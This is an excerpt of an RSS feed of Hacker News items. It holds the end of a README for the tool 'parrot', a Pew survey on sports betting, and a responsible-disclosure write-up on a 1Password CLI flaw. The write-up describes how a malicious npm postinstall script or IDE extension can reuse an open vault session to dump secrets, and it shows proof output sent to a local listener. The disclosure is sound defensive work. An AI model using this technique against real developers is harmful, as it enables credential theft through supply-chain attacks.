      &lt;item&gt;&lt;p&gt;Certain query annotations are not supported and will panic the process:&lt;/p&gt;&lt;code&gt;:execrows&lt;/code&gt;,&lt;code&gt;:execlastid&lt;/code&gt;,&lt;code&gt;:batchexec&lt;/code&gt;,&lt;code&gt;:batchone&lt;/code&gt;,&lt;code&gt;:batchmany&lt;/code&gt;,&lt;code&gt;:copyfrom&lt;/code&gt;. You can read more about it here: https://docs.sqlc.dev/en/stable/reference/query-annotations.html&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ideas and actionable tasks are collected and organised here: https://github.com/daniellionel01/parrot/issues&lt;/p&gt;
    &lt;p&gt;Contributions are welcomed!&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;This project was heavily inspired by &lt;code&gt;squirrel&lt;/code&gt;(Hex, GitHub). Thank you @giacomocavalieri!&lt;/item&gt;
      &lt;item&gt;Thank you to &lt;code&gt;sqlc&lt;/code&gt;(GitHub, Website)&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478033</guid><pubDate>Sun, 05 Oct 2025 00:51:44 +0000</pubDate></item><item><title>1Password CLI Vulnerability</title><link>https://codeberg.org/manchicken/1password-cli-vuln-disclosure</link><description>&lt;doc fingerprint="1e35fc187a3366d8"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;naughty&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;.gitignore&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;index.cjs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;LICENSE.md&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;package-lock.json&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;package.json&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;README.md&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h1"&gt;Testing 1Password&lt;/head&gt;
    &lt;p&gt;In October of 2023, I reported a vulnerability to 1Password regarding their &lt;code&gt;op&lt;/code&gt; (a.k.a. &lt;code&gt;1password-cli&lt;/code&gt;) program. In my report I detailed that their approach to prompting users only once, and then leaving the vault open to the CLI was easily exploited in supply-chain scenarios, especially when a threat actor targets developer toolchains. There are two attack paths I highlighted, and I supplied them with a proof for one of them.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Warning&lt;/p&gt;
      &lt;p&gt;This document is for research and educational purposes. Any use for the information below to cause harm or engaged in unauthorized access of any computer system is strictly prohibited.&lt;/p&gt;
      &lt;p&gt;Responsible disclosure was given on 2nd October, 2023 to 1Password, and in January of 2024 1Password authorized public disclosure of this vulnerability via BugCrowd.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This demo was tested across the three most recent versions of macOS, using &lt;code&gt;zsh&lt;/code&gt; and &lt;code&gt;bash&lt;/code&gt; shells using the latest 1Password desktop client.&lt;/p&gt;
    &lt;head rend="h2"&gt;Two Attack Paths&lt;/head&gt;
    &lt;p&gt;Both attacks would be a supply-chain attack, but there are two distinct paths:&lt;/p&gt;
    &lt;head rend="h3"&gt;IDE Path&lt;/head&gt;
    &lt;p&gt;The IDE path is pretty straight-forward, and I think carries the greatest risk:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I install the 1Password extension because I responsibly wish to keep my tokens in a safe place (e.g. not my &lt;code&gt;$ENV&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;I also use the MySQL extension in my IDE, it's nice to be able to stay in the same tool&lt;/item&gt;
      &lt;item&gt;I use the 1Password extension to resolve secret references, which requires me to unlock my vault&lt;/item&gt;
      &lt;item&gt;I installed a new red theme, red is my favorite color&lt;/item&gt;
      &lt;item&gt;That red theme is an extension, and contained malicious code which uses the &lt;code&gt;op&lt;/code&gt;NPM module to enumerate and exfiltrate every vault that I have access to&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Package manager path&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I install the 1Password CLI, and I use &lt;code&gt;op&lt;/code&gt;to protect secrets in my environment&lt;/item&gt;
      &lt;item&gt;I use GitHub Packages for NPM packages which are private to my organization&lt;/item&gt;
      &lt;item&gt;I hear of a really nifty plugin which will allow me to add syntax highlighting to shell output on this CLI project I'm working on, so I &lt;code&gt;npm i syntax-highlighting-stuff&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Oh no! &lt;code&gt;syntax-highlighting-stuff&lt;/code&gt;had a&lt;code&gt;post-install&lt;/code&gt;script on it, and it enumerated and exfiltrated the secrets from every vault I have access to&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Observed patterns&lt;/head&gt;
    &lt;p&gt;It seems like the vulnerability is that once you unlock your vault, anything spawned from the parent process of whatever opened the vault retains an active session to that open vault.&lt;/p&gt;
    &lt;code&gt;$ op run -- ls # This prompts me to unlock my vault
$ op run -- ls # The second call does not prompt me, the vault is already open
$ op read 'op://Foo/Bar/baz' # Still doesn't prompt me again because the vault is still open
&lt;/code&gt;
    &lt;p&gt;This also works with subprocesses:&lt;/p&gt;
    &lt;code&gt;$ export GITHUB_TOKEN='op://Foo/Bar/baz'
$ op run -- env | grep GITHUB_TOKEN # This will prompt me
$ bash # Start a new shell subprocess
$ op run -- env | grep GITHUB_TOKEN # This will not prompt me
$ bash # Now we're two shells deep in subprocesses
$ op run -- env | grep GITHUB_TOKEN # This will still not prompt me
&lt;/code&gt;
    &lt;head rend="h2"&gt;The Proof&lt;/head&gt;
    &lt;p&gt;This repository contains the code from the proof that I submitted to 1Password on 2nd October, 2023. Here are the instructions for running the proof:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The &lt;code&gt;index.cjs&lt;/code&gt;has a module which runs the&lt;code&gt;naughty&lt;/code&gt;module.&lt;/item&gt;
      &lt;item&gt;Either using netcat or &lt;code&gt;simple-exfil-service&lt;/code&gt;, listen on port&lt;code&gt;4242&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;To run this test, simply run &lt;code&gt;op run npm install&lt;/code&gt;like you needed a GitHub token&lt;/item&gt;
      &lt;item&gt;Afterward, check your output from port 4242, but also check to see if there is a &lt;code&gt;/tmp/naughty&lt;/code&gt;file&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here's what the person running &lt;code&gt;npm i&lt;/code&gt; would see:&lt;/p&gt;
    &lt;code&gt;❯ op run -- npm i

&amp;gt; 1password-cli-risks@1.0.0 postinstall
&amp;gt; node ./index.cjs

theItem:  {
  "id": "[redacted]",
  "title": "Fake Website Login",
  "version": 1,
  "vault": {
    "id": "[redacted]",
    "name": "Employee"
  },
  "category": "LOGIN",
  "last_edited_by": "[redacted]",
  "created_at": "2023-10-02T17:28:50Z",
  "updated_at": "2023-10-02T17:28:50Z",
  "additional_information": "fake.user",
  "fields": [
    {
      "id": "username",
      "type": "STRING",
      "purpose": "USERNAME",
      "label": "username",
      "value": "fake.user",
      "reference": "op://Employee/Fake Website Login/username"
    },
    {
      "id": "password",
      "type": "CONCEALED",
      "purpose": "PASSWORD",
      "label": "password",
      "value": "this-is-the-fake-password-in-plaintext",
      "reference": "op://Employee/Fake Website Login/password",
      "password_details": {
        "strength": "FANTASTIC"
      }
    },
    {
      "id": "notesPlain",
      "type": "STRING",
      "purpose": "NOTES",
      "label": "notesPlain",
      "reference": "op://Employee/Fake Website Login/notesPlain"
    }
  ]
}
Done.

up to date, audited 8 packages in 5s

found 0 vulnerabilities
&lt;/code&gt;
    &lt;p&gt;You can see that the demo attack is printing those values to STDOUT. I am only dumping one value, but the &lt;code&gt;op&lt;/code&gt; program and JavaScript library do have the ability to enumerate items in a vault, and vaults themselves.&lt;/p&gt;
    &lt;p&gt;Here's what my exfiltration server sees:&lt;/p&gt;
    &lt;code&gt;Request Headers:  {
  host: 'localhost:4242',
  connection: 'keep-alive',
  'content-type': 'text/plain;charset=UTF-8',
  accept: '*/*',
  'accept-language': '*',
  'sec-fetch-mode': 'cors',
  'user-agent': 'node',
  'accept-encoding': 'gzip, deflate',
  'content-length': '1082'
}
Request URL:  /
Received data: {
  "id": "[redacted]",
  "title": "Fake Website Login",
  "version": 1,
  "vault": {
    "id": "[redacted]",
    "name": "Employee"
  },
  "category": "LOGIN",
  "last_edited_by": "[redacted]",
  "created_at": "2023-10-02T17:28:50Z",
  "updated_at": "2023-10-02T17:28:50Z",
  "additional_information": "fake.user",
  "fields": [
    {
      "id": "username",
      "type": "STRING",
      "purpose": "USERNAME",
      "label": "username",
      "value": "fake.user",
      "reference": "op://Employee/Fake Website Login/username"
    },
    {
      "id": "password",
      "type": "CONCEALED",
      "purpose": "PASSWORD",
      "label": "password",
      "value": "this-is-the-fake-password-in-plaintext",
      "reference": "op://Employee/Fake Website Login/password",
      "password_details": {
        "strength": "FANTASTIC"
      }
    },
    {
      "id": "notesPlain",
      "type": "STRING",
      "purpose": "NOTES",
      "label": "notesPlain",
      "reference": "op://Employee/Fake Website Login/notesPlain"
    }
  ]
}
&lt;/code&gt;
    &lt;p&gt;Notice that the &lt;code&gt;value&lt;/code&gt; for the &lt;code&gt;password&lt;/code&gt; is in plaintext in both cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Risk&lt;/head&gt;
    &lt;p&gt;The 1Password CLI is marketed as a tool which makes technical practitioners safer by protecting credentials that are traditionally stored in plaintext in a user's environment variables on their local machine. This vulnerability demonstrates that while this does get the secrets out of your environment, it also drastically expands the potential blast radius for a successful malware or supply-chain attack.&lt;/p&gt;
    &lt;p&gt;To put it simply: the risk here is not that your GitHub secret will be leaked via an environment variable, the risk is that every vault you have access to could be dumped by a threat actor.&lt;/p&gt;
    &lt;p&gt;Additionally, as agentic AI tools become more commonplace, that may add additional risk factors which have yet to be considered in the research I'm presenting here.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;op&lt;/code&gt; tool doesn't just possess the ability to get individual items, it also has the ability to enumerate your vaults (&lt;code&gt;op vault list&lt;/code&gt;) and to enumerate items in a given vault (&lt;code&gt;op item list --vault abc123&lt;/code&gt;). The JavaScript module supports all of the same commands that the &lt;code&gt;op&lt;/code&gt; CLI tool does, too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Attempts to Mitigate&lt;/head&gt;
    &lt;p&gt;I have explored a number of paths to mitigate this.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Following the suggestion of a colleague, I experimented with using a separate vault for CLI secrets &lt;list rend="ul"&gt;&lt;item&gt;This doesn't work because you cannot limit the default vault from being read by the CLI&lt;/item&gt;&lt;item&gt;Not only that, but you can't set limits for things like shared vaults&lt;/item&gt;&lt;item&gt;As weird as it sounds, when you unlock one vault, you unlock all vaults which are accessible to the CLI tool&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;1Password recommended using service accounts to mitigate this, and I did try it, but I found some challenges as I started thinking of how to roll it out to teams &lt;list rend="ul"&gt;&lt;item&gt;This kinda sucks because that means each developer gets a separate service account user on their workstation&lt;/item&gt;&lt;item&gt;This also means that the developer has to manage a service account&lt;/item&gt;&lt;item&gt;In addition to being unweildy, this also means that each engineer must be diligent to not enable the shiny "Integrate with 1Password CLI" button in the Developer tab on the GUI settings&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Recommendations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I recommend that folks avoid using &lt;code&gt;op&lt;/code&gt;on developer workstations until 1Password has released a fix for these scenarios&lt;list rend="ul"&gt;&lt;item&gt;The best way to do this appears to be to make sure CLI integration checkbox is unchecked in the Developer settings screen.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;I recommend that when you must use &lt;code&gt;op&lt;/code&gt;, that it be limited to service accounts, per 1Password's recommendation, and that you carefully verify that the "Integrate with 1Password CLI" box is unchecked in the GUI settings&lt;/item&gt;
      &lt;item&gt;I recomment that, where possible, you get in the habit of always passing &lt;code&gt;--ignore-scripts&lt;/code&gt;to&lt;code&gt;npm&lt;/code&gt;commands, and find a similar pattern for any other package manager that you use in conjunction with&lt;code&gt;op&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I strongly recommend that 1Password modify their product to resolve this problem. Just spitballing, I think any of the following would be sufficient (this is an OR, not an AND):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allow users to limit access to vaults using CLI integrations&lt;/item&gt;
      &lt;item&gt;Allow users to designate individual items in their Vaults for use with the CLI&lt;/item&gt;
      &lt;item&gt;Prompt for specific vaults or items individually&lt;/item&gt;
      &lt;item&gt;Prompt for each process individually, closing the gap for subprocesses&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This investigation took a while, and I waited a while before publishing this disclosure (life circumstances and giving 1Password time to fix the issue). While 1Password is within their right not to issue a CVE or a fix for this vulnerability, I do think 1Password users (I am proud to be one) would be much safer if this issue were eliminated.&lt;/p&gt;
    &lt;p&gt;Thanks, please contact me with any corrections or feedback.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478553</guid><pubDate>Sun, 05 Oct 2025 03:01:50 +0000</pubDate></item><item><title>Americans increasingly see legal sports betting as a bad thing for society</title><link>https://www.pewresearch.org/short-reads/2025/10/02/americans-increasingly-see-legal-sports-betting-as-a-bad-thing-for-society-and-sports/</link><description>&lt;doc fingerprint="59d2d4ad970264c6"&gt;
  &lt;main&gt;
    &lt;p&gt;Public awareness of legal sports betting has grown in recent years – and so has the perception that it is a bad thing for society and sports, according to a new Pew Research Center survey.&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;For society (July 2022)&lt;/cell&gt;
        &lt;cell role="head"&gt;For society (July 2025)&lt;/cell&gt;
        &lt;cell role="head"&gt;For sports (July 2022)&lt;/cell&gt;
        &lt;cell role="head"&gt;For sports (July 2025)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;A bad thing&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
        &lt;cell&gt;33%&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;A good thing&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
        &lt;cell&gt;7%&lt;/cell&gt;
        &lt;cell&gt;16%&lt;/cell&gt;
        &lt;cell&gt;17%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Neither good nor bad&lt;/cell&gt;
        &lt;cell&gt;57%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
        &lt;cell&gt;49%&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;Today, 43% of U.S. adults say the fact that sports betting is now legal in much of the country is a bad thing for society. That’s up from 34% in 2022. And 40% of adults now say it’s a bad thing for sports, up from 33%.&lt;/p&gt;
    &lt;p&gt;Despite these increasingly critical views of legal sports betting, many Americans continue to say it has neither a bad nor good impact on society and on sports. Fewer than one-in-five see positive impacts.&lt;/p&gt;
    &lt;p&gt;Meanwhile, the share of Americans who have bet money on sports in the past year has not changed much since 2022.&lt;/p&gt;
    &lt;p&gt;Today, 22% of adults say they’ve personally bet money on sports in the past year. That’s a slight uptick from 19% three years ago. This figure includes betting in any of three ways:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;With friends or family, such as in a private betting pool, fantasy league or casual bet&lt;/item&gt;
      &lt;item&gt;Online with a betting app, sportsbook or casino&lt;/item&gt;
      &lt;item&gt;In person at a casino, racetrack or betting kiosk&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;July 2022&lt;/cell&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;With friends and family, such as in a private betting pool, fantasy league or casual bet&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Online with a betting app, sportsbook or casino&lt;/cell&gt;
        &lt;cell&gt;6%&lt;/cell&gt;
        &lt;cell&gt;10%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;In person at a casino, racetrack or betting kiosk&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;ANY of the above ways&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;All of this increase has come through online sports betting: 10% of adults now say they’ve placed a bet this way in the past year, up from 6% in 2022. There has been no change in the shares of adults who have bet on sports with family or friends or in person at a casino, racetrack or betting kiosk.&lt;/p&gt;
    &lt;p&gt;Commercial sports betting has spread rapidly across the United States since a Supreme Court ruling in 2018 gave states the green light to legalize it. At least 38 states, the District of Columbia and Puerto Rico now allow commercial sports betting in some form, according to the National Conference of State Legislatures.&lt;/p&gt;
    &lt;p&gt;In our new survey, 63% of adults say they’ve heard or read a lot or a little about the fact that sports betting is now legal in much of the U.S. That’s up from 56% in 2022. The increase in public awareness comes as betting-related advertisements have become common during sports broadcasts.&lt;/p&gt;
    &lt;p&gt;The rest of this analysis takes a closer look at Americans’ views of and experiences with sports betting. It’s based on the survey of 9,916 U.S. adults, conducted in July and August.&lt;/p&gt;
    &lt;head rend="h4"&gt;Many demographic groups increasingly view legal sports betting as a bad thing&lt;/head&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;July 2022&lt;/cell&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;U.S. adults&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Men&lt;/cell&gt;
        &lt;cell&gt;35%&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Women&lt;/cell&gt;
        &lt;cell&gt;33%&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Ages 18-29&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
        &lt;cell&gt;41%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;30-49&lt;/cell&gt;
        &lt;cell&gt;29%&lt;/cell&gt;
        &lt;cell&gt;39%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;50-64&lt;/cell&gt;
        &lt;cell&gt;37%&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;65+&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
        &lt;cell&gt;49%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;White&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
        &lt;cell&gt;46%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Black&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Hispanic&lt;/cell&gt;
        &lt;cell&gt;29%&lt;/cell&gt;
        &lt;cell&gt;37%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Asian*&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
        &lt;cell&gt;48%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;College grad&lt;/cell&gt;
        &lt;cell&gt;39%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Non-college grad&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
        &lt;cell&gt;38%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Upper income&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Middle income&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;44%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Lower income&lt;/cell&gt;
        &lt;cell&gt;28%&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Rep/Lean Rep&lt;/cell&gt;
        &lt;cell&gt;38%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Dem/Lean Dem&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Sports bettor&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Non-sports bettor&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;Since 2022, Americans in many demographic groups have become more likely to view the widespread legalization of sports betting as a bad thing for society, as well as for sports.&lt;/p&gt;
    &lt;p&gt;This is true for men and women; college graduates and non-college graduates; and upper-, middle- and lower-income Americans alike. It is also the case among Democrats and Republicans, as well as among those who have personally placed a sports bet in the past year and those who have not.&lt;/p&gt;
    &lt;p&gt;Some of the biggest shifts in attitudes about sports betting’s societal impact have come among young Americans – especially young men. Today, 47% of men under 30 say legal sports betting is a bad thing for society, up from 22% who said this in 2022. Women under 30 have also become more likely to express this view: 35% see legal sports betting as bad for society, up from 25% three years ago.&lt;/p&gt;
    &lt;p&gt;The legalization of sports betting has generated revenue for state governments and gambling operators, but it has also raised concerns about gambling addiction and other societal harms. Critics have also cautioned that it may compromise the integrity of sports. In recent years, several professional and college athletes and team personnel have been punished for violating betting rules.&lt;/p&gt;
    &lt;head rend="h4"&gt;Who has bet money on sports in the past year?&lt;/head&gt;
    &lt;p&gt;Note: White, Black and Asian adults include those who report being only one race and not Hispanic. Hispanic adults are of any race. Family income tiers are based on adjusted 2024 earnings. The full question wording was “With friends or family (such as a private betting pool, fantasy league, or casual bet).”&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;U.S. adults&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Men&lt;/cell&gt;
        &lt;cell&gt;25%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Women&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Ages 18-29&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;30-49&lt;/cell&gt;
        &lt;cell&gt;26%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;50-64&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;65+&lt;/cell&gt;
        &lt;cell&gt;12%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;White&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Black&lt;/cell&gt;
        &lt;cell&gt;30%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Hispanic&lt;/cell&gt;
        &lt;cell&gt;27%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Asian*&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;College grad&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Non-college grad&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Upper income&lt;/cell&gt;
        &lt;cell&gt;26%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Middle income&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Lower income&lt;/cell&gt;
        &lt;cell&gt;21%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Rep/Lean Rep&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Dem/Lean Dem&lt;/cell&gt;
        &lt;cell&gt;24%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Note: White, Black and Asian adults include those who report being only one race and not Hispanic. Hispanic adults are of any race. Family income tiers are based on adjusted 2024 earnings. The full question wording was “With friends or family (such as a private betting pool, fantasy league, or casual bet).”&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;As was the case in 2022, some groups of Americans are more likely than others to say they’ve personally bet money on sports in the past year in any of the ways we asked about.&lt;/p&gt;
    &lt;p&gt;Young adults are more likely than older Americans to say they’ve placed a sports bet in the past year. Some 31% of adults under 30 say this, including 36% of men and 29% of women in this age group. Sports betting is less common in all older age groups.&lt;/p&gt;
    &lt;p&gt;Black and Hispanic adults are also especially likely to have bet money on sports in the past year: 30% and 27%, respectively, say they have done so. Roughly two-in-ten Asian (22%) and White (19%) adults say the same.&lt;/p&gt;
    &lt;p&gt;There are no differences between college graduates and non-college graduates on this question. In each group, 22% say they have bet on sports in the past year. Nor are there major partisan differences: 24% of Democrats and Democratic-leaning independents say they have done so, as have 22% of Republicans and Republican leaners.&lt;/p&gt;
    &lt;head rend="h4"&gt;Who has placed an online sports bet in the past year?&lt;/head&gt;
    &lt;p&gt;When it comes to online sports betting, young adults and Black Americans again stand out.&lt;/p&gt;
    &lt;p&gt;Overall, 17% of adults under 30 – including 21% of men and 16% of women in this age group – say they’ve placed an online sports wager in the past year. Three years ago, 7% of those under 30 had done so – including 9% of men and 6% of women.&lt;/p&gt;
    &lt;p&gt;Among Black adults, 19% say they’ve placed an online sports bet in the past year, up from 10% in 2022. Smaller shares of Hispanic (12%), Asian (11%) and White (8%) adults say they’ve done this in the past year.&lt;/p&gt;
    &lt;p&gt;Note: Senior Writer Drew DeSilver and Research Analyst Ted Van Green contributed to this analysis. Here are the questions used, the topline and the survey methodology.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478749</guid><pubDate>Sun, 05 Oct 2025 04:01:57 +0000</pubDate></item><item><title>Ambigr.am</title><link>https://ambigr.am/hall-of-fame</link><description>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
